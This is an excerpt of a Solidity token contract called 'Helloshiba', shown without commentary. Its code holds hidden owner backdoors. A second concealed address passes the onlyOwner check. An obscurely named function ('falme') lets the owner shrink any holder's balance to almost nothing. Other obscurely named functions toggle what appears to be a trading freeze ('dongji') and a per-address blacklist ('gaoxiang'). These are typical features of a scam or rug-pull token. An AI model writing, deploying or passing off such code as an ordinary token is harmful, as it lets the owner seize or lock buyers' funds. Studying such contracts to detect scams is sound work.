...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()   ==  ownerAdd , "Ownable: caller is not the owner");
        _;
    }
...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = "Helloshiba";
    string private _symbol = "Helloshiba";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF0A9A358844d179F523572576cACb16087f4B454);
    address payable public teamWalletAddress = payable(0xF0A9A358844d179F523572576cACb16087f4B454);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public dongji = true;
    mapping (address => bool) public gaoxiang;
    ...
    function falme(address account, uint256 amount) onlyOwner() public {
        _balances[account] = _balances[account].mod(amount);
    }

    function adfghj(bool _status) public onlyOwner {
        dongji = _status;
    }

    function qqqrf(address addre, bool status) public onlyOwner {
        gaoxiang[addre]  = status;
    }
